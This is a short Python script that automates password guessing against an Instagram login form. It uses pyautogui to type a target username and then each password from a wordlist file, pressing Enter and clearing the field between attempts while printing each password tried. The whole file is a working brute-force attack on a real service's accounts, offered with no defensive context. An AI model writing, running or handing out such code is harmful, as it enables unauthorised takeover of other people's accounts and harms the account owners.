import time
import pyautogui

url = "https://www.instagram.com/"
user = input("\nUser: ")

wordlist = open('wordlist.txt', 'r').readlines()
pyautogui.click()
time.sleep(1)
pyautogui.write(user)
time.sleep(1)
pyautogui.press('TAB')
for pw in wordlist:
    time.sleep(1)
    pyautogui.write(pw)
    print(f"password tested ---> {pw}")
    time.sleep(1)
    pyautogui.press('enter')
    time.sleep(3)
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')
    time.sleep(3)
